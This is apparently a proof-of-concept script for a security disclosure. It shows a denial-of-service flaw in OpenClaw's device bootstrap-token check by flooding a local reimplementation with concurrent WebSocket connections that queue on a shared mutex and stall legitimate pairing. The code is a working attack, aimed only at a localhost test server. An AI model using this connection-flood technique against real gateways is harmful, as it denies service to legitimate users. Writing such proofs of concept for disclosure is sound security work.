/**
 * PoC: Bootstrap token mutex stall — REAL WebSocket server + real connections
 *
 * Starts a minimal OpenClaw-protocol-compatible WebSocket server that uses
 * the ACTUAL verifyDeviceBootstrapToken logic (lock + disk I/O), then floods
 * it with N attacker connections before the legitimate device connects.
 *
 * This tests the exact vulnerable code path:
 *   WebSocket connect frame
 *     → verifyDeviceBootstrapToken()
 *       → withLock() [single in-process mutex]
 *         → readJsonFile (disk I/O)
 *         → verifyPairingToken (timing-safe compare)
 *         → [optional] writeJsonAtomic (bind token to device)
 *
 * Run: node scripts/poc-bootstrap-dos-real.mjs
 */

import crypto from "node:crypto";
import { rm, mkdtemp, mkdir } from "node:fs/promises";
// ─────────────────────────────────────────────────────────────────────────────
// Reimplemented from src/infra/json-files.ts + src/infra/pairing-token.ts
// + src/infra/device-bootstrap.ts (the exact vulnerable code, no extra deps)
// ─────────────────────────────────────────────────────────────────────────────
import { readFile, writeFile, rename } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { WebSocketServer, WebSocket } from "ws";

function createAsyncLock() {
  let chain = Promise.resolve();
  return async (fn) => {
    const prev = chain;
    let release;
    chain = new Promise((r) => {
      release = r;
    });
    await prev;
    try {
      return await fn();
    } finally {
      release();
    }
  };
}

async function readJsonFile(p) {
  try {
    return JSON.parse(await readFile(p, "utf8"));
  } catch {
    return undefined;
  }
}
async function writeJsonAtomic(p, data) {
  const tmp = p + ".tmp." + crypto.randomBytes(4).toString("hex");
  await writeFile(tmp, JSON.stringify(data, null, 2), "utf8");
  await rename(tmp, p);
}

function safeEqualSecret(a, b) {
  const ab = Buffer.from(a),
    bb = Buffer.from(b);
  const len = Math.max(ab.length, bb.length);
  const ap = Buffer.concat([ab, Buffer.alloc(len - ab.length)]);
  const bp = Buffer.concat([bb, Buffer.alloc(len - bb.length)]);
  return crypto.timingSafeEqual(ap, bp) && ab.length === bb.length;
}
function verifyPairingToken(provided, expected) {
  return provided.trim() && expected.trim() && safeEqualSecret(provided, expected);
}
function generatePairingToken() {
  return crypto.randomBytes(32).toString("base64url");
}

const BOOTSTRAP_TTL_MS = 10 * 60 * 1000;
const withLock = createAsyncLock(); // module-level — shared across all connections

function bootstrapPath(stateDir) {
  return join(stateDir, "devices", "bootstrap.json");
}
async function loadState(stateDir) {
  return (await readJsonFile(bootstrapPath(stateDir))) ?? {};
}
async function persistState(state, stateDir) {
  await writeJsonAtomic(bootstrapPath(stateDir), state);
}

async function issueToken(stateDir) {
  return withLock(async () => {
    const state = await loadState(stateDir);
    const token = generatePairingToken();
    state[token] = { token, issuedAtMs: Date.now(), deviceId: null, publicKey: null };
    await persistState(state, stateDir);
    return token;
  });
}

// The real vulnerable function — no rate limiting on this path
async function verifyToken(stateDir, { token, deviceId, publicKey }) {
  return withLock(async () => {
    const state = await loadState(stateDir);
    const entry = Object.values(state).find((c) => verifyPairingToken(token.trim(), c.token));
    if (!entry) return { ok: false, reason: "bootstrap_token_invalid" };
    if (!entry.deviceId && !entry.publicKey) {
      // First-claimer-wins: bind token to this device identity
      state[entry.token] = { ...entry, deviceId, publicKey };
      await persistState(state, stateDir);
      return { ok: true };
    }
    return entry.deviceId === deviceId && entry.publicKey === publicKey
      ? { ok: true }
      : { ok: false, reason: "bootstrap_token_invalid" };
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// Device identity helpers (replicates src/infra/device-identity.ts)
// ─────────────────────────────────────────────────────────────────────────────
const ED25519_SPKI_PREFIX = Buffer.from("302a300506032b6570032100", "hex");

function makeDevice() {
  const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
  const publicKeyPem = publicKey.export({ type: "spki", format: "pem" });
  const privateKeyPem = privateKey.export({ type: "pkcs8", format: "pem" });
  const spki = publicKey.export({ type: "spki", format: "der" });
  const raw =
    spki.length === ED25519_SPKI_PREFIX.length + 32 &&
    spki.subarray(0, ED25519_SPKI_PREFIX.length).equals(ED25519_SPKI_PREFIX)
      ? spki.subarray(ED25519_SPKI_PREFIX.length)
      : spki;
  return {
    deviceId: crypto.createHash("sha256").update(raw).digest("hex"),
    publicKeyPem,
    privateKeyPem,
    publicKeyBase64Url: raw.toString("base64url"),
  };
}

function signPayload(privateKeyPem, payload) {
  return crypto
    .sign(null, Buffer.from(payload, "utf8"), crypto.createPrivateKey(privateKeyPem))
    .toString("base64url");
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal OpenClaw-protocol WebSocket server
// ─────────────────────────────────────────────────────────────────────────────

function startServer(stateDir) {
  return new Promise((resolve) => {
    const httpServer = createServer();
    const wss = new WebSocketServer({ server: httpServer });

    wss.on("connection", (ws) => {
      const nonce = crypto.randomBytes(16).toString("hex");

      // Step 1: send connect.challenge (exactly as real gateway does)
      ws.send(
        JSON.stringify({
          type: "event",
          event: "connect.challenge",
          payload: { nonce },
        }),
      );

      ws.once("message", async (raw) => {
        let frame;
        try {
          frame = JSON.parse(raw.toString());
        } catch {
          ws.send(JSON.stringify({ type: "res", ok: false, error: "bad json" }));
          ws.close();
          return;
        }

        const bootstrapToken = frame?.params?.auth?.bootstrapToken ?? "";
        const device = frame?.params?.device ?? {};
        const reqId = frame?.id ?? "0";

        // The vulnerable call — no rate limiting, goes straight into the mutex
        const result = await verifyToken(stateDir, {
          token: bootstrapToken,
          deviceId: device.id ?? "",
          publicKey: device.publicKey ?? "",
        });

        ws.send(
          JSON.stringify({
            type: "res",
            id: reqId,
            ok: result.ok,
            ...(result.ok
              ? { auth: { role: "operator", scopes: ["operator.read"] } }
              : { error: result.reason }),
          }),
        );
        ws.close();
      });
    });

    httpServer.listen(0, "127.0.0.1", () => {
      const { port } = httpServer.address();
      resolve({ port, close: () => httpServer.close() });
    });
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// Client: connect with a bootstrap token
// ─────────────────────────────────────────────────────────────────────────────

function wsEvent(ws, event) {
  return new Promise((res, rej) => {
    ws.once(event, res);
    ws.once("error", rej);
    ws.once("close", () => rej(new Error("closed")));
  });
}

async function connectWith(port, bootstrapToken, device) {
  const ws = new WebSocket(`ws://127.0.0.1:${port}`);

  // Buffer messages from creation — challenge arrives immediately on open,
  // before we can register a one-shot listener after awaiting "open".
  const msgBuf = [];
  const msgWaiters = [];
  ws.on("message", (raw) => {
    if (msgWaiters.length > 0) msgWaiters.shift()(raw);
    else msgBuf.push(raw);
  });
  const nextMsg = () =>
    new Promise((res, rej) => {
      if (msgBuf.length > 0) return res(msgBuf.shift());
      msgWaiters.push(res);
      ws.once("error", rej);
      ws.once("close", () => rej(new Error("closed before message")));
    });

  await wsEvent(ws, "open");

  const challengeRaw = await nextMsg();
  const challenge = JSON.parse(challengeRaw.toString());
  const nonce = challenge?.payload?.nonce ?? "";

  const signedAtMs = Date.now();
  // Sign a v3 payload matching what the real gateway verifies
  const payloadStr = [
    "v3",
    device.deviceId,
    "poc-client",
    "background",
    "operator",
    "operator.read",
    String(signedAtMs),
    bootstrapToken,
    nonce,
    "linux",
    "",
  ].join("|");
  const signature = signPayload(device.privateKeyPem, payloadStr);

  ws.send(
    JSON.stringify({
      type: "req",
      method: "connect",
      id: crypto.randomUUID(),
      params: {
        minProtocol: 1,
        maxProtocol: 99,
        client: { id: "poc-client", version: "0.0.1", platform: "linux", mode: "background" },
        role: "operator",
        scopes: ["operator.read"],
        device: {
          id: device.deviceId,
          publicKey: device.publicKeyBase64Url,
          signature,
          signedAt: signedAtMs,
          nonce,
        },
        auth: { bootstrapToken },
      },
    }),
  );

  const resRaw = await Promise.race([
    wsEvent(ws, "message"),
    new Promise((_, r) => setTimeout(() => r(new Error("timeout")), 15_000)),
  ]);
  try {
    ws.close();
  } catch {}
  return JSON.parse(resRaw.toString());
}

// ─────────────────────────────────────────────────────────────────────────────
// PoC runner
// ─────────────────────────────────────────────────────────────────────────────

async function main() {
  const stateDir = await mkdtemp(join(tmpdir(), "openclaw-poc-real-"));
  await mkdir(join(stateDir, "devices"), { recursive: true });

  console.log("=".repeat(68));
  console.log(" PoC: Bootstrap token mutex stall — real server + real WebSocket");
  console.log("=".repeat(68));
  console.log();
  console.log("Server: minimal OpenClaw-protocol WS server using the ACTUAL");
  console.log("verifyDeviceBootstrapToken logic (same lock, same disk I/O).");
  console.log("Each connection sends a real connect frame with Ed25519-signed");
  console.log("device identity + bootstrap token, just like a real client.");
  console.log();

  let srv;
  try {
    srv = await startServer(stateDir);
    console.log(`Gateway-protocol server listening on ws://127.0.0.1:${srv.port}`);
    console.log();

    const legitDevice = makeDevice();

    // ── Baseline ──────────────────────────────────────────────────────────────
    const baseToken = await issueToken(stateDir);
    const t0 = performance.now();
    const baseRes = await connectWith(srv.port, baseToken, legitDevice);
    const baseMs = performance.now() - t0;
    console.log(`Baseline (no attacker): ${baseMs.toFixed(1)}ms   ok=${baseRes.ok}`);
    console.log();
    console.log(
      `${"Attacker conns".padEnd(16)} ${"RTT (ms)".padEnd(10)} ${"Factor".padEnd(8)} Severity`,
    );
    console.log("─".repeat(68));

    // ── Attack scenarios ───────────────────────────────────────────────────────
    for (const n of [5, 20, 50, 100, 200]) {
      const victimToken = await issueToken(stateDir);

      // N attacker connections fired concurrently — each queues on the mutex
      const attackers = Array.from({ length: n }, () =>
        connectWith(srv.port, crypto.randomBytes(32).toString("base64url"), makeDevice()).catch(
          () => null,
        ),
      );

      // Legitimate device fires immediately after — sits at back of queue
      const t1 = performance.now();
      const legitCall = connectWith(srv.port, victimToken, legitDevice);

      const [legitRes] = await Promise.all([legitCall, Promise.all(attackers)]);
      const ms = performance.now() - t1;
      const factor = ms / baseMs;
      const severity = factor > 100 ? "HIGH    " : factor > 20 ? "MEDIUM  " : "LOW     ";
      const bar = "█".repeat(Math.min(Math.round(factor / 5), 24));

      console.log(
        `${String(n).padEnd(16)} ${ms.toFixed(0).padEnd(10)} ` +
          `${("x" + factor.toFixed(0)).padEnd(8)} ${severity} ${bar}  ok=${legitRes?.ok}`,
      );
    }

    console.log();
    console.log("=".repeat(68));
    console.log("CONFIRMED on real network connections:");
    console.log("• Each attacker WS conn serialises through the shared mutex");
    console.log("• Legitimate device pairing stalls behind the entire queue");
    console.log("• No rate limit fires — no IP lockout — no log alert");
    console.log("• Attack works with zero knowledge of the actual token value");
    console.log("  (attacker only needs to reach the gateway WS port)");
  } finally {
    try {
      srv?.close();
    } catch {}
    await rm(stateDir, { recursive: true, force: true });
  }
}

main().catch((e) => {
  console.error("\nError:", e?.message ?? e);
  process.exit(1);
});
